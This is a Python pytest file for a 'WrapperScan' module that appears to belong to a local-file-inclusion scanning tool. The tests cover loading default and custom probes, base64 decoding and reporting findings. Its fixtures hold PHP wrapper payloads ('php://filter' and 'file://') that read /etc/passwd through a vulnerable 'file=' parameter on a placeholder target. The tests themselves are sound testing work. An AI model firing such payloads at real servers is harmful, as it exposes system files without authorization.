from types import SimpleNamespace

from core.WrapperScan import WrapperScan


class FakeResponse:
    status_code = 200
    headers = {}
    elapsed = None

    def __init__(self, text):
        self.text = text


def make_args(**overrides):
    defaults = {
        "url": "http://target.local/page.php?file=",
        "cookies": None,
        "method": "GET",
        "headers": None,
        "post_data": None,
        "wrapper_list": None,
    }
    defaults.update(overrides)
    return SimpleNamespace(**defaults)


def test_wrapper_scan_uses_default_probes_without_list():
    scan = WrapperScan(make_args())

    probes = scan._load_probes()

    assert probes == WrapperScan.DEFAULT_PROBES
    assert any(probe["name"] == "php-filter-base64" for probe in probes)


def test_wrapper_scan_loads_custom_payload_list(tmp_path):
    payload_list = tmp_path / "wrappers.txt"
    payload_list.write_text(
        "# ignored\n"
        "custom-filter=php://filter/read=convert.base64-encode/resource=/etc/passwd\n"
        "file:///etc/passwd\n"
    )

    scan = WrapperScan(make_args(wrapper_list=str(payload_list)))

    assert scan._load_probes() == [
        {
            "name": "custom-filter",
            "payload": "php://filter/read=convert.base64-encode/resource=/etc/passwd",
            "indicators": [],
            "custom": True,
        },
        {
            "name": "custom-3",
            "payload": "file:///etc/passwd",
            "indicators": [],
            "custom": True,
        },
    ]


def test_wrapper_scan_decodes_php_filter_base64_response():
    scan = WrapperScan(make_args())
    probe = {"decode_base64": True}
    response = FakeResponse("cm9vdDp4OjA6MDovcm9vdDovYmluL2Jhc2g=")

    text = scan._response_text(response, probe)

    assert "root:x:0:0:/root:/bin/bash" in text


def test_wrapper_scan_reports_wrapper_specific_finding(monkeypatch):
    scan = WrapperScan(make_args())
    monkeypatch.setattr(
        scan,
        "_load_probes",
        lambda: [
            {
                "name": "file-linux",
                "payload": "file:///etc/passwd",
                "indicators": ["root:"],
            }
        ],
    )
    monkeypatch.setattr(scan, "attack", lambda payload: FakeResponse("root:x:0:0"))

    findings = scan.execute_wrapper_scan()

    assert findings[0]["wrapper"] == "file-linux"
    assert findings[0]["evidence"] == "root:"
